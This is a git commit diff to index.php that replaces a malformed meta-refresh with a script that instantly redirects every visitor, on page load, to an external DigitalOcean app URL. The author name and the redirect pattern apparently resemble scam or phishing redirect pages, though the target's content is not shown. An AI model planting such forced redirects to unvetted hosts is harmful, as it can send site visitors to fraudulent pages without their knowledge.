2b93393fd5d78464418731f8f12446bd43093da6
SupportSpotX24 <abilashgupta7@gmail.com>
2026-01-27 10:27:48 -0500

    Update index.php

--- index.php
+++ index.php
@@ -14,10 +14,8 @@
 </script>
 
   <script>
-    <title>Redirecting...</title>
-   <!-- Instant Redirect -->
-    <meta http-equiv="refresh" content="0; url=https://ioerr-app-guwjw.ondigitalocean.app">
-      </script>
+    window.location.replace("https://ioerr-app-guwjw.ondigitalocean.app");
+</script>
   
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -891,6 +889,7 @@ function toggleMenu(){
 
 </body>
 </html>
+
 
 
 
